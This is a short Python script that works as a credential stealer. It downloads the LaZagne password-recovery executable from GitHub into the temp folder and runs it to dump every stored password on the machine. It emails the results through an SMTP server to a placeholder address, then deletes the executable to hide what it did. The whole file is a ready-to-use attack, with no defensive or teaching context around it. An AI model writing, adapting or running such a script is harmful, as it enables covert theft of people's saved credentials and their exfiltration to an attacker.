#!/usr/bin/env python

import requests
import subprocess
import smtplib
import re
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP(host="SMTP_SERVER_HERE",
                          port=587)
    server.starttls()
    server.login(email, password)
    server.sendmail(from_addr=email,
                    to_addrs=email,
                    msg=message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
exec_file = "lazagne.exe"
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = subprocess.check_output(exec_file + " all", shell=True)
send_mail("SET_EMAIL_HERE", "SET_PASSWORD_HERE", result)
os.remove(exec_file)
